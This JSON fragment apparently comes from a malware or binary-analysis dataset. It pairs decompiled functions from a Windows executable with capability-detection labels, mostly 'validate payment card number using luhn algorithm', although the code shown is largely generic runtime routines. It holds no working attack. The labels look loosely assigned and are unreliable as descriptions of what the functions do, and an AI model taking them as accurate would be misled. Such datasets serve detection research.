        "decompiled_code": "\nuint __fastcall fcn.00405fe0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar2 = fcn.00405bc0(param_1 + 0x28);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *(param_1 + 0x28) = iVar1;\n    if (iVar1 < 0) {\n        *(param_1 + 0x28) = 0xffffffff;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 185
    },
    "0040677a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040677a(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x31) != '*') {\n        uVar2 = fcn.00405b64(param_1 + 0x24);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *(param_1 + 0x24) = iVar1;\n    if (iVar1 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        *(param_1 + 0x24) = -*(param_1 + 0x24);\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 214
    },
    "004067a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004067a5(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar2 = fcn.00405bc0(param_1 + 0x24);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *(param_1 + 0x24) = iVar1;\n    if (iVar1 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        *(param_1 + 0x24) = -*(param_1 + 0x24);\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 218
    },
    "004072e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004072e9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    fcn.0040526f(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    return;\n}\n",
        "token_count": 97
    },
    "0040730d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040730d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    fcn.004053eb(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    return;\n}\n",
        "token_count": 96
    },
    "00407edd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00407edd(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    fcn.004131f0(0x41a328, 0xc);\n    iVar1 = *(unaff_EBP + 0x10);\n    if (iVar1 == 0) {\n        cVar5 = fcn.00408037();\n        if (cVar5 != '\\0') {\n            fcn.0040807b(*(unaff_EBP + 8));\n        }\n    }\n    fcn.0040bc0a(2);\n    *(unaff_EBP + -4) = 0;\n    if (*0x41dd20 != '\\0') goto code_r0x00407fb4;\n    *0x41dd18 = 1;\n    *(unaff_EBP + -4) = 1;\n    iVar2 = *(unaff_EBP + 0xc);\n    if (iVar2 == 0) {\n        uVar4 = *0x41c028 & 0x1f;\n        uVar3 = 0x20 - uVar4 & 0x1f;\n        if (*0x41dd1c != ((0U >> uVar3 | 0 << 0x20 - uVar3) ^ *0x41c028)) {\n            uVar6 = *0x41c028 ^ *0x41dd1c;\n            (**0x4141ac)(0, 0, 0);\n            (*(uVar6 >> uVar4 | uVar6 << 0x20 - uVar4))();\n        }\n        arg_8h_00 = 0x41dd30;\ncode_r0x00407f79:\n        fcn.00408635(arg_8h_00);\n    }\n    else if (iVar2 == 1) {\n        arg_8h_00 = 0x41dd3c;\n        goto code_r0x00407f79;\n    }\n    *(unaff_EBP + -4) = 0;\n    if (iVar2 == 0) {\n        fcn.00407e29(0x4141e0, 0x4141f0);\n    }\n    fcn.00407e29(0x4141f4, 0x4141f8);\n    if (iVar1 == 0) {\n        *0x41dd20 = '\\x01';\n    }\ncode_r0x00407fb4:\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00407fe7();\n    if (iVar1 == 0) {\n        fcn.00407ff6(*(unaff_EBP + 8));\n        fcn.00407eca(***(unaff_EBP + -0x14));\n        return;\n    }\n    fcn.00413239();\n    return;\n}\n",
        "token_count": 719
    },
    "00409b9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409b9e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.00409b57(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.00408c43(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 122
    },
    "0040acb3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040acb3(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 42
    },
    "0040acc7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040acc7(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 43
    },
    "0040bc0a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bc0a(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection * 0x18 + 0x41df70);\n    return;\n}\n",
        "token_count": 50
    },
    "0040bc52": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bc52(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection * 0x18 + 0x41df70);\n    return;\n}\n",
        "token_count": 50
    },
    "0040c203": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c203(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.0040c238();\n    if (iVar1 == 0) {\n        **(in_ECX + 4) = arg_8h;\n        *(in_ECX + 4) = *(in_ECX + 4) + 4;\n        iVar1 = 0;\n    }\n    else {\n        fcn.004088c0(arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 129
    },
    "0040d9d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d9d8(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch == 0) || (arg_10h <= 0xffffffe0 / arg_ch)) {\n        if (arg_8h == 0) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = fcn.00410bb7(arg_8h);\n        }\n        arg_ch = arg_ch * arg_10h;\n        iVar2 = fcn.00410bea(arg_8h, arg_ch);\n        if ((iVar2 != 0) && (uVar3 < arg_ch)) {\n            fcn.00403a00(iVar2 + uVar3, 0, arg_ch - uVar3);\n        }\n    }\n    else {\n        puVar1 = fcn.00409b44();\n        *puVar1 = 0xc;\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 252
    },
    "0040dc79": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040dc79(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00409766();\n    return iVar1 + 8;\n}\n",
        "token_count": 42
    },
    "00403192": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403192(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00404892(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 109
    },
    "004111b3": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.004111b3(void)\n\n{\n    *0x41c7a0 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 65
    }
}